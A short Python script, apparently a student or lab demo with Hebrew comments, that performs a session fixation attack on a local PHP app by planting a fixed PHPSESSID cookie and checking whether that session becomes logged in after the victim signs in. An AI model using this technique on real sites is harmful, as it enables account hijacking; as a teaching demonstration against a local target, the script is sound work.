import requests

BASE_URL = "http://localhost/CyberProject/login.php"

# 1. התוקף בוחר מזהה סשן ספציפי (Session ID)
fixed_session_id = "HACKER_CONTROLLED_SESSION_123"

# 2. התוקף "מכין" את הסשן אצל השרת (פשוט גולש לאתר עם המזהה הזה)
cookies = {'PHPSESSID': fixed_session_id}
print(f"[*] Setting up fixed session: {fixed_session_id}")
requests.get(BASE_URL, cookies=cookies)

print("-" * 40)
print(f"[!] INSTRUCTION FOR DEMO:")
print(f"1. Open your browser and set the 'PHPSESSID' cookie to: {fixed_session_id}")
print(f"2. Log in as any user in that browser.")
print(f"3. Run the verification part of this script to see that I am now logged in as you!")
print("-" * 40)

# 3. בדיקה - האם עכשיו הסשן הזה מחובר? (אחרי שתעשי לוגין בדפדפן)
def check_status():
    response = requests.get("http://localhost/CyberProject/home.php", cookies=cookies)
    if "Welcome" in response.text:
        print("[!!!] SUCCESS: We are logged in using the fixed session!")
    else:
        print("[-] Not logged in yet. Perform login in the browser first.")

if __name__ == "__main__":
    # בהדגמה, תריצי את זה אחרי שתעשי לוגין בדפדפן עם הקוקי הקבוע
    check_status()